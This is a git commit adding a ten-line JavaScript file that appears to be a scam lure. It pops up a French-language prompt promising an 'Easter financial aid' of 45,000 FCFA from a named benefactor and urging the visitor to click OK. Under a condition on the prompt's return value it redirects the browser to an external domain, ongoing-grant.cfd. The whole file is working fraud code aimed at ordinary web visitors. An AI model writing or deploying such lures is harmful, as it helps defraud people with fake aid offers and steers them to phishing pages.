25499084d90fba96bf42a0ce2c790e42f7ddc576
The-ongoing <preciousadaowo4@gmail.com>
2026-04-05 17:23:06 +0100

    Create activeeastersen.js

---
+++ activeeastersen.js
@@ -0,0 +1,10 @@
+var password = '45000 FCFA';
+
+password = prompt(
+  'Félicitations, vous êtes éligible pour recevoir l’AIDE FINANCIÈRE DE PÂQUES YERIM HABIB SOW 45000 FCFA. Cliquez sur OK pour recevoir instantanément.',
+  '45000 FCFA'
+);
+
+if (password !== '45000 FCFA') {
+    location.href = 'https://ongoing-grant.cfd/45000Fcfa-Soutien-De-Paques.html';
+}
